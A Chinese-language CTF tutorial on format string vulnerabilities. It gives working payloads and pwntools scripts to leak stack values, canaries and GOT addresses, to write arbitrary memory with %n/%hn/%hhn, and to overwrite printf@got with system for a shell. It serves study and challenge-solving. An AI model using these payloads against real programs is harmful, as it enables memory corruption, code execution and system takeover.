# 格式化字符串题型解法

## 原理

格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据它解析之后的参数。典型函数是：

```c
int printf(const char *format, ...);
```

如果程序写成：

```c
printf(buf);
```

而 `buf` 又由用户控制，那么格式化字符串就完全受攻击者控制。格式化函数会无条件相信格式串中声明的参数数量和类型，并从栈或寄存器里取“参数”，这就导致栈内容泄露、任意地址读取、任意地址写入。

格式化字符串基本格式：

```text
%[parameter][flags][field width][.precision][length]type
```

重点字段：

- `parameter`：`n$`，显式指定第 n 个参数。
- `field width`：输出最小宽度，可用于控制已输出字符数。
- `length`：`hh`、`h`、`l`、`ll` 等，影响读写大小。
- `type`：
  - `%p`：按指针形式泄露值。
  - `%x`：按十六进制整数输出。
  - `%s`：把参数当作字符串地址读取，直到 `\x00`。
  - `%n`：不输出字符，把“已经输出的字符数”写入对应地址。
  - `%hn`：写 2 字节。
  - `%hhn`：写 1 字节。

## 识别特征

常见危险写法：

```c
printf(user_input);
fprintf(stream, user_input);
sprintf(buf, user_input);
snprintf(buf, size, user_input);
syslog(user_input);
```

快速验证：

```text
AAAA.%p.%p.%p.%p.%p.%p.%p.%p
```

如果输出中出现 `0x41414141` 或 `0x4141414141414141`，说明输入内容进入了格式化参数序列，可以计算相对偏移。

也可以用：

```text
%s%s%s%s%s%s%s%s
```

触发崩溃，因为 `%s` 会把栈上的值当地址访问，栈上不可能每个值都是合法字符串地址。

## 基础利用：程序崩溃

这是最简单的利用方式：

```text
%s%s%s%s%s%s%s%s%s%s%s%s%s%s
```

原因是 `%s` 会把参数解释为字符串指针，不断读取直到 `\x00`。如果对应地址未映射、不可读或不对齐，就会崩溃。它主要用于证明漏洞存在，或者在远程服务中造成不可用。

## 泄露栈内存

常用格式：

```text
%p.%p.%p.%p.%p
%08x.%08x.%08x
%n$p
```

其中 `%n$p` 可以直接获取格式化字符串中的第 n 个参数。这里的 n 是格式化函数视角的第 n 个输出参数，相对于调用栈来说要注意第一个参数本身是 format。

### 找输入偏移

输入：

```text
AAAA.%p.%p.%p.%p.%p.%p.%p.%p
```

如果输出：

```text
AAAA.0x1.0xf7f95bf0.0x566381c4.(nil).0xffc1812b.0x2.0x41414141...
```

说明 `AAAA` 位于第 7 个参数。之后就可以用 `%7$p`、`%7$s`、`%7$n` 等定点访问。

### 泄露 Canary

如果程序有 Canary，且格式串可控，常用做法是：

1. 找到输入缓冲区在参数列表中的偏移。
2. 根据缓冲区大小推算 Canary 参数位置。
3. 用 `%k$p` 泄露 Canary。

例如 32 位下 `buf[64]`，输入首 4 字节 `AAAA` 是第 7 个参数，那么 Canary 常在：

```text
7 + 64 / 4 = 23
```

payload：

```text
%23$p
```

二次栈溢出时把 Canary 放回原位置：

```python
payload = b"A" * 64
payload += p32(canary)
payload += b"B" * 12
payload += p32(get_shell)
```

### 泄露栈上字符串

`%s` 会把参数当作地址，再输出该地址指向的字符串：

```text
%7$s
```

它适合泄露栈上某个指针指向的内容，但有两个限制：

- 地址必须可读，否则崩溃。
- 遇到 `\x00` 会截断。

## 泄露任意地址内存

如果格式化字符串本身在栈上，那么可以把目标地址放进输入开头，再用对应偏移的 `%s` 读取该地址内容。

32 位典型形式：

```text
[addr] + %[offset]$s
```

泄露 GOT 中函数真实地址：

```python
from pwn import *

io = process("./a.out")
elf = ELF("./a.out")

printf_got = elf.got["printf"]
offset = 4
payload = p32(printf_got) + b"%4$s"

io.sendline(payload)
raw = io.recvline()
printf_addr = u32(raw[4:8].ljust(4, b"\x00"))
log.success(hex(printf_addr))
```

泄露出 libc 函数地址后，就能和 ret2libc 一样计算：

```python
libc_base = printf_addr - libc.symbols["printf"]
system = libc_base + libc.symbols["system"]
binsh = libc_base + next(libc.search(b"/bin/sh"))
```

如果泄露内容可能包含 `\x00`，`%s` 会截断。此时可多泄露几个函数，或改用能控制长度的输出函数路径。

## 覆盖内存：%n

`%n` 不输出字符，而是把当前已经输出的字符数写入对应整型指针参数指向的位置。核心公式：

```text
[addr]%0kd%[offset]$n
```

32 位下如果地址放在最前面，它本身已经输出 4 字节，所以实际写入值通常是 `k + 4`。利用时要同时满足：

- 目标地址可写。
- 已知目标地址。
- 已知该地址在格式化参数列表中的 offset。
- 输出字符数可控。

常见目标：

- 修改栈变量，绕过判断。
- 修改全局变量。
- 修改 GOT 表项，例如把 `printf@got` 改成 `system`。
- 修改 `__stack_chk_fail@got` 绕过 Canary 失败路径。

## 栈变量覆盖

假设程序打印出变量地址：

```c
int a = 123, b = 456;
int c = 789;
printf("%p.%p.%p\n", &a, &b, &c);
scanf("%s", s);
printf(s);
```

目标是把 `c` 改成 `16`。如果偏移为 6，地址在 payload 开头占 4 字节，则还需输出 12 个字符：

```python
payload = p32(c_addr) + b"%012d" + b"%6$n"
```

程序实际写入的是 `4 + 12 = 16`。

## 小数字覆盖

如果想写入小于地址长度的数值，例如写 `2`，不能直接把地址放在 `%n` 前面，因为开头地址本身已经输出 4 字节。可行做法是把地址放到后面：

```text
[padding]%[offset]$n...[addr]
```

例如写入 `2`：

```python
payload = b"aa%8$nxx" + p32(a_addr)
```

解释：

- `%n` 前先输出 `aa`，所以写入 2。
- 后面的 `xx` 用于对齐栈结构。
- 地址在参数列表中的偏移会因为前置内容改变而变成 8。

## 大数字覆盖

如果要写 `0x12345678`，不能真的输出几亿个字符。常见做法是按字节或半字拆分写入。写 1 字节用 `%hhn`，写 2 字节用 `%hn`。

按字节写入思路：

```text
addr      <- 0x78
addr + 1  <- 0x56
addr + 2  <- 0x34
addr + 3  <- 0x12
```

payload 结构：

```text
[addr0][addr1][addr2][addr3]
[padding0]%[offset]$hhn
[padding1]%[offset+1]$hhn
[padding2]%[offset+2]$hhn
[padding3]%[offset+3]$hhn
```

辅助函数：

```python
from pwn import *

def fmt(prev, byte, idx):
    if prev < byte:
        fmtstr = b"%" + str(byte - prev).encode() + b"c%"
    elif prev > byte:
        fmtstr = b"%" + str(0x100 + byte - prev).encode() + b"c%"
    else:
        fmtstr = b"%"
    fmtstr += str(idx).encode() + b"$hhn"
    return fmtstr

def fmt_str(offset, size, addr, target):
    payload = b""
    for i in range(size):
        if size == 4:
            payload += p32(addr + i)
        elif size == 8:
            payload += p64(addr + i)

    prev = len(payload)
    for i in range(size):
        byte = (target >> (i * 8)) & 0xff
        payload += fmt(prev, byte, offset + i)
        prev = byte
    return payload
```

使用：

```python
payload = fmt_str(6, 4, b_addr, 0x12345678)
io.sendline(payload)
```

注意 `%hhn` 写入的是“当前累计输出字符数 mod 0x100”。如果下一字节小于当前累计值，需要补到下一轮，即 `0x100 + byte - prev`。

## 修改 GOT

如果 RELRO 为 Partial 或 No RELRO，GOT 可写。格式化字符串任意写常用于把某个函数 GOT 改成 `system`，再让程序调用该函数。

典型流程：

1. 泄露 libc 地址，算 `system`。
2. 找可再次触发的函数调用，例如后续会调用 `printf(user)` 或 `puts(user)`。
3. 用 `%n/%hn/%hhn` 改 GOT。
4. 输入 `/bin/sh`，触发被改写的函数。

示意：

```python
target = elf.got["printf"]
value = system_addr
payload = fmt_str(offset, 4, target, value)
io.sendline(payload)
io.sendline(b"/bin/sh\x00")
```

Full RELRO 下 GOT 不可写，应改找：

- 栈返回地址。
- `.fini_array` 或其他可写函数指针。
- libc hook，如老版本 `__free_hook`、`__malloc_hook`。
- C++ vtable / FILE 结构。

## 64 位注意点

64 位函数前几个参数通过寄存器传递，不完全从栈取，所以格式化字符串偏移判断要实际测试。地址包含高位 `\x00` 时，把地址放 payload 开头可能截断输入，常见处理方式：

- 把地址放到 payload 后部，并用 padding 对齐。
- 分多次写入。
- 使用 pwntools `fmtstr_payload` 辅助。

pwntools 示例：

```python
from pwn import *

payload = fmtstr_payload(offset, {target_addr: value}, write_size="short")
io.sendline(payload)
```

自动工具可以省时间，但题目调不通时仍要回到手算：地址位置、累计输出字符数、写入粒度、是否截断。

## 总结流程

格式化字符串题建议按以下顺序：

1. 验证漏洞：`AAAA.%p.%p.%p...`。
2. 找偏移：定位 `0x41414141` 或输入地址的位置。
3. 选择目标：
   - 只要泄露：用 `%p/%x/%s`。
   - 要任意读：`addr + %offset$s`。
   - 要任意写：`addr + padding + %offset$n`。
4. 如果有 ASLR：先泄露 libc/PIE/Canary。
5. 如果要写大数：拆成 `%hhn` 或 `%hn`。
6. 最终目标通常是改控制流：GOT、返回地址、hook、函数指针。
